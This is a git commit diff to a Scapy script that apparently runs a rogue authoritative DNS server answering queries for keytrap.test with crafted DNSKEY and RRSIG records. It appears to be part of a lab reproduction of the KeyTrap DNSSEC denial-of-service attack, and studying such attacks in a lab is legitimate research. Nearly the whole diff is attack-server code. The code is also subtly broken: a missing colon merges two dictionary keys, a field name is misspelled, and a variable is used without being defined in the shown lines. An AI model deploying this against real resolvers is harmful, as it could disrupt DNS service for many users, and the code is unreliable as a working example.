a4b8e71a69e9d66208f75d19126ab44ce330864f
TochusC <205329624@qq.com>
2024-09-26 15:58:09 +0800

    Fix bug in NSTrap.py

--- ScapyDNS/MalfareAuth/NSTrap.py
+++ ScapyDNS/MalfareAuth/NSTrap.py
@@ -12,38 +12,42 @@ DOMAIN_NAME = "keytrap.test"
 BPF_FILTER = "udp port " + PORT_OF_SERVER 
 
 RRSIG={
+    "www.keytrap.test."
     "keytrap.test.": "u3i18XgPPsVN7bQlmWvSqPx0wtzNgsmEGW8FQ21Qiot67v4/MjkY8H27la+5eJIjo+eYIo1FpuUa2wxZ0eHA8dWck7ek0KFH/oibMSzvDWPkVBMwLFpjiOiiJVN5sOtw",
     "ns1.keytrap.test.": "/iNOASO1o0PtfxvlLIkrq/hb+jJqhbJeAstiNmjj/Ck7jYvBg+0xUL/rAaN9+RpA/vqa7uxX8zaI2xutux1avqQvHYngyU9ETjJNu6G6sLCqLTOrDPhrjbiV1OyVWdu2",
-    "ns2.keytrap.test.": "vX1F0V3g3q3wvzU2kz1q0q6a3"
 }
 
 def handle_A_query(pkt):
     qname = pkt[DNS].qd.qname.decode("utf-8")
-    if(qname == "www.keytrap.test."):
+    if qname in ["www.keytrap.test.", "keytrap.test.", "ns1.keytrap.test."]:
         spf_dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                         ancount=2, an=[
                             DNSRR(rrname=qname, type=1, ttl=10, rdata="1.2.3.4"),
-                            DNSRRRSIG(rrname=qname, keytag=6350, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
+                            DNSRRRSIG(rrname=qname, keytag=6350, signersname="keytrap.test", signature=RRSIG[qname]),
                         ],
-                        nscount=1, ns=DNSRR(rrname="ns1", type=2, ttl=60, rdata="ns1.keytrap.test."),
+                        nscount=2, ns=[
+                            DNSRR(rrname="keytrap.test.", type=2, ttl=60, rdata="ns1.keytrap.test."),
+                            DNSRRRSIG(rrname="keytrap.test.", keytag=6350, typecoverred=2, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
+                        ],
                         arcount=2, ar=[
                             DNSRR(rrname="ns1.keytrap.test.", type=1, ttl=60, rdata="1.2.3.4"),
                             DNSRRRSIG(rrname="ns1.keytrap.test.", keytag=6350, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                         ],
-                        )
+                    )
+    else:
+        spf_dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd)
     return spf_dns
 
 def handle_DNSKEY_query(pkt):
     qname = pkt[DNS].qd.qname.decode("utf-8")
-    if(qname == "www.keytrap.test."):
-        spf_dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
-                        ancount=4, an=[
-                            DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=257, publickkey="MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY"),
-                            DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=256, publickkey="MjY4X0GT9jf00V9bZU7cMkceFGdUMgbeNK4afF6BB/VznyKXsZlTeX5IgrD/8BNWd1jMvvL5RlbBXbmy5022d34VqReK5IRA6WKxp9uzDBEpc6qoh2npdudDTsFMZKor"),
-                            DNSRRRSIG(rrname="keytrap.test.", keytag=6350, typecovered=48, signersname="keytrap.test.", signature="RV1t5PrsLi9tSUYq9ZNtFoXT8cmJYVUzOsn7xYPItKC7ky7Kpqiykk6HJIcnU4yyMbY2eLVfdjUZFqu0dKl5yQnJvuVswc6ZvbWUtPc1ElbETHKve+MqGZagRPfwulLT"),
-                            DNSRRRSIG(rrname="keytrap.test.", keytag=30130, typecovered=48, signersname="keytrap.test.", signature="n4xGxlkb2FsJ3/nSfPaznBYXM4lDbMXLcXvIuxMNoRwpkdoKgUDX1PcwxnPhVS8T8Pi9SFM7KdhEl6b0lj/wtZPJtEA1oncjoE5sC7atr66ncAIpt9XVkCufFpepA8P/"),
-                        ],
-                    )
+    spf_dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
+                    ancount=4, an=[
+                        DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=257, publickkey="MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY"),
+                        DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=256, publickkey="MjY4X0GT9jf00V9bZU7cMkceFGdUMgbeNK4afF6BB/VznyKXsZlTeX5IgrD/8BNWd1jMvvL5RlbBXbmy5022d34VqReK5IRA6WKxp9uzDBEpc6qoh2npdudDTsFMZKor"),
+                        DNSRRRSIG(rrname="keytrap.test.", keytag=6350, typecovered=48, signersname="keytrap.test.", signature="RV1t5PrsLi9tSUYq9ZNtFoXT8cmJYVUzOsn7xYPItKC7ky7Kpqiykk6HJIcnU4yyMbY2eLVfdjUZFqu0dKl5yQnJvuVswc6ZvbWUtPc1ElbETHKve+MqGZagRPfwulLT"),
+                        DNSRRRSIG(rrname="keytrap.test.", keytag=30130, typecovered=48, signersname="keytrap.test.", signature="n4xGxlkb2FsJ3/nSfPaznBYXM4lDbMXLcXvIuxMNoRwpkdoKgUDX1PcwxnPhVS8T8Pi9SFM7KdhEl6b0lj/wtZPJtEA1oncjoE5sC7atr66ncAIpt9XVkCufFpepA8P/"),
+                    ],
+                )
     return spf_dns
 
 # 构造DNS响应
@@ -53,12 +57,12 @@ def craft_dns_response(pkt):
     
     # 查询A记录
     if qtype == 1:
-        spf_resp /= handle_A_query(pkt)
+        reply_pkt /= handle_A_query(pkt)
     # 查询DNSKEY记录
     elif qtype == 48:
-        spf_resp /= handle_DNSKEY_query(pkt)
+        reply_pkt /= handle_DNSKEY_query(pkt)
 
-    return spf_resp
+    return reply_pkt
 
 # 处理DNS查询请求
 def dns_response(pkt):
